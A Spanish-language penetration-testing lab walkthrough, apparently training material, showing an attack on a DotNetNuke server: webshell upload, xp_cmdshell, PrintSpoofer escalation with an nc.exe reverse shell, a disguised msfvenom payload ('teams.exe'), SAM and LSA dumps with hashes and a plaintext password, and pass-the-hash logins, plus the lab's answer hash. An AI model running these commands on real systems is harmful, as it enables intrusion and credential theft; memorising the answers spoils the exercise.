
# Explotación y escalada de privilegios

En este punto, hemos pasado de las etapas `Information Gathering` y `Vulnerability Assessment` a la etapa `Exploitation` del proceso de pruebas de penetración. Tras establecernos, enumeramos los hosts disponibles, buscamos puertos abiertos y sondeamos los servicios accesibles.

***

## <mark style="color:purple;">Atacando DNN</mark>

Vayamos a DNN y probemos con el par de credenciales `Administrator:D0tn31Nuk3R0ck$$@123`. Esto es un éxito, hemos iniciado sesión como administrador superusuario. Aquí queremos registrar otros dos hallazgos de alto riesgo: `Insecure File Shares` y `Sensitive Data on File Shares`. Podríamos combinarlos en uno, pero conviene destacarlos como problemas separados, ya que si el cliente restringe el acceso anónimo, pero todos los usuarios del dominio pueden acceder al recurso compartido y ver datos innecesarios para su trabajo diario, sigue existiendo un riesgo.

<figure><img src="/files/2koGL04ZZT7dHj02PIxy" alt=""><figcaption></figcaption></figure>

Enumerando el objetivo se puede acceder a una consola SQL en la página `Settings` donde podemos habilitar `xp_cmdshell` y ejecutar comandos del sistema operativo. Para habilitarla, primero debemos pegar estas líneas en la consola una por una y hacer clic en `Run Script`. No obtendremos ningún resultado de cada comando, pero si no hay errores, normalmente significa que funciona.

```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

Si esto funciona, podemos ejecutar comandos del sistema operativo en formato `xp_cmdshell '<command here>'`. Podríamos usarlo para obtener un reverse shell o trabajar en la escalada de privilegios.

<figure><img src="/files/XKoAEVntnZP2lUjg6NON" alt=""><figcaption></figcaption></figure>

Otro aspecto interesante de DNN es que podemos [cambiar las extensiones de archivo permitidas](https://dnnsupport.dnnsoftware.com/hc/en-us/articles/360004928653-Allowable-File-Types-and-Extensions-for-Upload) y subir archiivos `.asp` o `.aspx`. Esto resulta útil si no podemos obtener RCE a través de la consola SQL. Si se realiza correctamente, podemos subir un webshell ASP y obtener ejecución remota de código en el servidor `DEV01`. La lista de extensiones de archivo permitidas se puede modificar para incluir `.asp` , `.aspx` o `.exe`. Para ello, basta con buscar `Settings -> Security -> More -> More Security Settings` y añadirlas en `Allowable File Extensions`, y hacer clic en el botón `Save`.&#x20;

<figure><img src="/files/p53jdpdrbDYzOKWdK5dw" alt=""><figcaption></figcaption></figure>

Una vez hecho esto, podemos subir un [webshell ASP](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp) tras buscar `http://172.16.8.20/admin/file-management`. Haz clic en el botón "Upload Files" y seleccione el Webshell ASP que descargamos en nuestro host de ataque.

<figure><img src="/files/6R9BZMah1L7hg0niPm5x" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/NsAASbwOGoqSDmOGLJQM" alt=""><figcaption></figcaption></figure>

Una vez cargado, podemos hacer clic derecho en el archivo subido y seleccionar `Get URL`. La URL resultante nos permitirá ejecutar comandos a través del webshell, donde podremos trabajar para obtener un reverse shell o realizar pasos de escalada de privilegios, como veremos a continuación.

<figure><img src="/files/gJ9GQgqiiOlqkSzsurEP" alt=""><figcaption></figcaption></figure>

```
http://172.16.8.20/Portals/0/webshell.asp
```

<figure><img src="/files/LWADYt5M03un8yR2qfXX" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Escalada de privilegios</mark>

A continuación, necesitamos escalar privilegios. En el resultado del comando anterior, vimos que tenemos privilegios `SeImpersonate`. Siguiendo los pasos de las secciones [SeImpersonate y SeAssignPrimaryToken](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/privilegios-de-usuario-en-windows/seimpersonate-y-seassignprimarytoken.md) del módulo `Escalada de privilegios en Windows`, podemos escalar nuestros privilegios a SYSTEM, lo que nos permitirá establecer un punto de apoyo inicial en el dominio de Active Directory (AD) y comenzar a enumerar AD.

Intentaremos escalar privilegios con la herramienta `PrintSpoofer` y luego veremos si podemos extraer credenciales útiles de la memoria o el registro del host. Necesitaremos `nc.exe` en el host `DEV01` para enviarnos un shell y el binario `PrintSpoofer64.exe` para aprovechar los privilegios `SeImpersonate`.&#x20;

{% embed url="<https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0>" %}

Hay varias maneras de transferirlos. Podríamos usar el host  `dmz01` como "host de salto" y transferir nuestras herramientas a través de él mediante SCP, y luego iniciar un servidor web Python3 y descargarlas en el host DEV01 usando `certutil`.

Una forma más sencilla sería modificar el DNN `Allowable File Extensions` de nuevo para permitir el formato de archivo `.exe`. Luego, podemos cargar ambos archivos y confirmar mediante nuestro shell que se encuentran en formato `c:\DotNetNuke\Portals\0`.

Una vez cargado, podemos iniciar un listener `Netcat` en el host `dmz01` y ejecutar el siguiente comando para obtener un reverse shell como `NT AUTHORITY\SYSTEM`:

```shell-session
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

Ejecutamos el comando y obtenemos un reverse shell casi instantáneamente.

```shell-session
root@dmz01:/tmp# nc -lnvp 443

Listening on 0.0.0.0 443
Connection received on 172.16.8.20 58480
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
ACADEMY-AEN-DEV01
```

Desde aquí, podemos realizar una post-explotación y recuperar manualmente el contenido de la base de datos SAM y con él, el hash de la contraseña del administrador local.

```cmd-session
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE

The operation completed successfully.
```

Ahora podemos modificar de nuevo las extensiones de archivo permitidas para poder descargar los archivos `.SAVE`. A continuación, podemos volver a la página `File Management`  y descargar cada uno de los tres archivos a nuestro host de ataque.

<figure><img src="/files/aJAUtbuB7EfoacXODipx" alt=""><figcaption></figcaption></figure>

Finalmente, podemos usar `secretsdump` para volcar la base de datos SAM y recuperar un conjunto de credenciales de los LSA Secrets.

```shell-session
afsh4ck@kali$ impacket-secretsdump LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

Confirmamos que estas credenciales funcionan con `CrackMapExec` y que ahora tenemos una forma de regresar a este sistema en caso de que perdamos nuestro reverse shell.

```shell-session
afsh4ck@kali$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>

ProxyChains-3.1 (http://proxychains.sf.net)
[*] Initializing LDAP protocol database
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:135-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator <redacted> (Pwn3d!)
```

En el resultado anterior, observamos una contraseña en texto plano, pero no se ve inmediatamente para qué usuario es. Podríamos volver a volcar LSA usando `CrackMapExec` y confirmar que la contraseña corresponde al usuario `hporter`.

Ya tenemos nuestro primer conjunto de credenciales de dominio para el dominio INLANEFREIGHT.LOCAL. `hporter:Gr8hambino!`Podemos confirmarlo desde nuestro shell inverso en `dmz01`.

```shell-session
c:\DotNetNuke\Portals\0> net user hporter /dom
net user hporter /dom

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 11:32:05 AM
Password expires             Never
Password changeable          6/1/2022 11:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 7:03:10 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

También podríamos escalar privilegios en el host DEV01 aprovechando la vulnerabilidad `PrintNightmare`. Existen otras maneras de recuperar las credenciales, como usar Mimikatz. Experimente con esta máquina y aplique las diversas habilidades aprendidas para `Penetration Tester Path`realizar estos pasos de todas las maneras posibles y encontrar la que mejor se adapte a sus necesidades.

En este momento, no tenemos hallazgos adicionales que anotar, ya que solo abusamos de la funcionalidad integrada, lo cual no pudimos hacer debido a los problemas de intercambio de archivos mencionados anteriormente. Podríamos registrarlo `PrintNightmare`como un hallazgo de alto riesgo si logramos explotarlo.

***

### Método alternativo: Reverse Port Forwarding

Hay muchas maneras de atacar esta red y lograr los mismos resultados, así que no las cubriremos todas aquí, pero una que vale la pena mencionar es el [reenvío de puertos remoto/inverso con SSH](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/pivoting-tunelling-y-port-forwarding/remote-reverse-port-forwarding-con-ssh.md) . Digamos que queremos devolver un reverse shell desde el host `DEV01` a nuestro host de ataque. No podemos hacerlo directamente porque no estamos en la misma red, pero podemos aprovechar `dmz01` para realizar el reenvío de puertos inverso y lograr nuestro objetivo.&#x20;

Es posible que queramos obtener un shell de Meterpreter en el objetivo o un shell inverso directamente por varias razones. También podríamos haber realizado todas estas acciones sin obtener un shell, ya que podríamos haber usado `PrintSpoofer` para agregar un administrador local o volcar credenciales desde `DEV01` y luego conectarnos al host de cualquier número de maneras desde nuestro host de ataque usando Proxychains (pass-the-hash, RDP, WinRM, etc.). Vea cuántas maneras puede lograr la misma tarea de interactuar con el host `DEV01` directamente desde su host de ataque. Es esencial ser versátil, y esta red de laboratorio es un gran lugar para practicar tantas técnicas como sea posible y perfeccionar nuestras habilidades.

Analicemos rápidamente el método de reenvío de puertos inverso. Primero, necesitamos generar una carga útil usando `msfvenom`. Ten en cuenta que aquí especificaremos la dirección IP del host pivote  `dmz01` en el campo `lhost` y NO la IP de nuestro host de ataque, ya que el objetivo no podría conectarse directamente con nosotros.

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 787 bytes
Final size of exe file: 7168 bytes
Saved as: teams.exe
```

A continuación, debemos configurar un listener `multi/handler` e iniciarlo en un puerto diferente al que utilizará la carga útil que generamos:

{% hint style="warning" %}
Importante seleccionar un puerto diferente para que funcione bien el port forwarding y no falle
{% endhint %}

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 7000; run"
```

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000
```

A continuación, necesitamos subir el payload de reverse shell `teams.exe` al host de destino `DEV01`. Podemos usar SCP hasta `dmz01`, iniciar un servidor web Python en ese host y descargar el archivo. Como alternativa, podemos usar el administrador de archivos DNN para subir el archivo como hicimos anteriormente.&#x20;

Con el payload en el destino, debemos configurar el `SSH remote port forwarding` y el reenvío del puertos del host pivote dmz01 al puerto `443` del listener de Metasploit `7000`. El indicador (`-R`) indica al host pivote que escuche en el puerto `443` y reenvíe todo el tráfico entrante a este puerto a nuestro listener de Metasploit  `0.0.0.0:7000` configurado en nuestro host de ataque.

```bash
ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.229.147 -vN

debug1: OpenSSH_10.0p2 Debian-5, OpenSSL 3.5.2 5 Aug 2025
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.129.229.147 [10.129.229.147] port 22.
debug1: Connection established.
```

A continuación, ejecute la carga útil `teams.exe` desde el host `DEV01` y, si todo va según lo planeado, recuperaremos la conexión.

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (175174 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:51146 ) at 2022-06-22 12:21:25 -0400

(Meterpreter 2)(c:\windows\system32\inetsrv) > getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
```

Una advertencia sobre el método anterior es que, por defecto, OpenSSH solo permite la conexión a puertos remotos reenviados desde el propio servidor (localhost). Para ello, debemos editar el archivo `/etc/ssh/sshd_config` en sistemas Ubuntu y cambiar la línea `GatewayPorts no` a `GatewayPorts yes`; de lo contrario, no podremos obtener una respuesta en el puerto que reenviamos en el comando SSH (el puerto 443 en nuestro caso).&#x20;

Para ello, necesitaremos acceso root SSH al host desde el que estamos pivotando. A veces, veremos esta configuración configurada así, por lo que funciona de inmediato, pero si no tenemos acceso root al host ni la posibilidad de modificar temporalmente el archivo de configuración SSH (y recargarlo para que surta efecto con `service sshd reload`), no podremos realizar el reenvío de puertos de esta manera. Tenga en cuenta que este tipo de cambio crea una vulnerabilidad de seguridad en el sistema del cliente, por lo que conviene aclararlo con él, anotar el cambio y hacer todo lo posible por revertirlo al final de las pruebas. Vale la pena leer esta [publicación](https://www.ssh.com/academy/ssh/tunneling/example) para comprender mejor el reenvío remoto SSH.

#### Explotación: [Pregunta 1](#pregunta-1)

***

### Un buen comienzo

Ahora que hemos enumerado la red interna atacada en nuestro primer host, escalado privilegios, realizado la postexplotación y configurado nuestros pivotes/múltiples métodos para evaluar la red interna, centrémonos en el entorno de AD. Dado que contamos con un conjunto de credenciales, podemos realizar diversas enumeraciones para comprender mejor el entorno y buscar vías para acceder a la administración del dominio.

#### Pass the Hash con Evil WinRM

```shell-session
afsh4ck@kali$ proxychains evil-winrm -i 172.16.8.20 -u Administrator -H 0e20798f695ab0d04bc138b22344cea8

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
academy-aen-dev\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/22/2022   9:05 PM             17 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
K33p_0n_sp**********!
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.2.103
```

### Pregunta 1

> Recupere el contenido de la base de datos SAM en el host DEV01. Envíe el hash NT del usuario administrador como respuesta.

#### Configurar proxy en el navegador

Necesitamos configurar el proxy para navegar a sitios de la red interna:

<figure><img src="/files/uQQzpPzK59swbf41gzNf" alt=""><figcaption></figcaption></figure>

#### Acceso al login de DNN

Al navegar a la siguiente dirección llegamos al panel de login de admin de DNN:

```bash
http://172.16.8.20/Login?returnurl=%2fadmin
```

<figure><img src="/files/vs6m40iaHC0IEfE3FWLE" alt=""><figcaption></figcaption></figure>

Introducimos las credenciales que encontramos al montar NFS:

```
Administrator:D0tn31Nuk3R0ck$$@123
```

Al acceder nos encontramos un directorio `File Management` y dentro la siguiente estructura de archivos:

```
Root/
├── Images/
├── Templates/
└── Users/
```

En `Users` hay un directorio `002`, que al pulsarlo nos muestra un panel de configuración:

```http
http://172.16.8.20/Admin/File-Management?folderId=40&view=gridview&pageSize=10
```

<figure><img src="/files/x54Q15GUYJ8UAdWkrDYs" alt=""><figcaption></figcaption></figure>

#### Modificar extensiones permitidas

La lista de extensiones de archivo permitidas se puede modificar para incluir `.asp` , `.exe` y `.aspx`; para ello, basta con buscar `Settings -> Security -> More -> More Security Settings` y añadirlas en `Allowable File Extensions`, y hacer clic en el botón `Save`.&#x20;

<figure><img src="/files/p53jdpdrbDYzOKWdK5dw" alt=""><figcaption></figcaption></figure>

Una vez hecho esto, podemos subir un [webshell ASP](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp) en `http://172.16.8.20/admin/file-management`. En el directorio Root hacemos clic en el botón "`Subir archivos`" y seleccionamos el webshell ASP que descargamos en nuestro host de ataque.

<figure><img src="/files/fxQ91oVq1xDEwK4xvCXx" alt=""><figcaption></figcaption></figure>

Una vez cargado, hacemos clic derecho en el archivo subido y seleccionamos `Get URL`. La URL que nos genera nos permitirá ejecutar comandos a través del webshell, donde podremos trabajar para obtener un reverse shell.

<figure><img src="/files/X3pTbXGnaWK7Bgngvubu" alt=""><figcaption></figcaption></figure>

```
http://172.16.8.20/Portals/0/newaspcmd.asp?ver=ySZkWYIErgUYNRny59Jklw%3d%3d
```

<figure><img src="/files/8JmZgQeDDLOpaJ0rmX0R" alt=""><figcaption></figcaption></figure>

#### Escalada de privilegios

Vamos a escalar privilegios con la herramienta `PrintSpoofer` y luego veremos si podemos extraer credenciales útiles de la memoria o el registro del host. Necesitaremos `nc.exe` en el host `DEV01` para enviarnos un shell y el binario `PrintSpoofer64.exe` para aprovechar los privilegios `SeImpersonate`. Hay varias maneras de transferirlos.

La forma más sencilla sería modificar el DNN `Allowable File Extensions` de nuevo para permitir el formato de archivo `.exe`. Luego, podemos cargar ambos archivos en `http://172.16.8.20/admin/file-management` y confirmar mediante nuestro shell que se encuentran en formato `c:\DotNetNuke\Portals\0`.

<figure><img src="/files/iAEyVvnNHm784kqBmtUp" alt=""><figcaption></figcaption></figure>

Una vez cargado, podemos iniciar un listener `Netcat` en el host `dmz01` y ejecutar el siguiente comando en el webshell para obtener un reverse shell como `NT AUTHORITY\SYSTEM`:

```shell-session
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

En DMZ01 abrimos un listener de Netcat por el puerto 443:

```shell-session
root@dmz01:/tmp# nc -lnvp 443

Listening on 0.0.0.0 443
```

Ejecutamos el comando y obtenemos un reverse shell casi instantáneamente.

<figure><img src="/files/7qWuOF3EcMDaMgOWLyCa" alt=""><figcaption></figcaption></figure>

Desde aquí, podemos realizar una post-explotación y recuperar manualmente el contenido de la base de datos SAM y con él, el hash de la contraseña del administrador local.

```cmd-session
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE

The operation completed successfully.
```

Ahora podemos modificar de nuevo las extensiones de archivo permitidas para poder descargar los archivos `.SAVE`. A continuación, podemos volver a la página `File Management`  y descargar cada uno de los tres archivos a nuestro host de ataque.

<figure><img src="/files/N9kdfjhD2TE6AuGyhuqU" alt=""><figcaption></figcaption></figure>

#### Extracción de los hashes

Al extraer los hashes obtenemos una contraseña en plano `Gr8hambino!`, pero que no corresponde a ningún usuario, llamándonos mucho la atención:

```shell-session
afsh4ck@kali$ impacket-secretsdump LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:83149b892315469ded73f92168ce5d60383d1f7ddf831deb8402025d9183673572fb55dcf6f827eb62046f08b1fb37fbd9048b9afe76457d1054982cfab0fd4a1882d73ac774b2e7abb0a41fa9576ed3b7396eb18c7d4a3afe6fb0abf6852b8f54d2b0fee8ac70c5181a435fe7df2cc534f54255ad0c6b58604ca8409bc0a88c7755d484c7a5b712837374878987954a640c0a27f45f786aaeabf83a7924cf3b5d533de4b4142efaff77d86cb88f3adfb8d37f11cdaf57a866addcd91915c4e2158da73dc75df3ecf008db44e2a3838c659f3bd555165adb96d25a4b5c12625afe64eb9f3fd8ff643d2d073e90c95845
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:18c7b736e82f3c505262f838dd7c4326
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

#### Confirmación de acceso

Observamos que tenemos acceso con el hash del administrador:

```shell-session
afsh4ck@kali$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H 0e20798f695ab0d04bc138b22344cea8

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:135  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
```

#### Volcado de LSASS como Administrador (opcional)

Al volcar lsass como administrador observamos que la contraseña `Gr8hambino!` que encontramos pertenece al  usuario `hporter`:

```shell-session
afsh4ck@kali$  proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H 0e20798f695ab0d04bc138b22344cea8 --lsa

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:135  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:445  ...  OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator:0e20798f695ab0d04bc138b22344cea8 (Pwn3d!)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] Dumping LSA secrets
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes256-cts-hmac-sha1-96:d87e1fca921f09244695b9914b251176c90fad31b8dbb0ff24cd95e9beba3ae1
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:aes128-cts-hmac-sha1-96:fce106bc65486d37dd4fe111f7a160cd
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  INLANEFREIGHT\ACADEMY-AEN-DEV$:des-cbc-md5:8664ef64c2ea2ae5
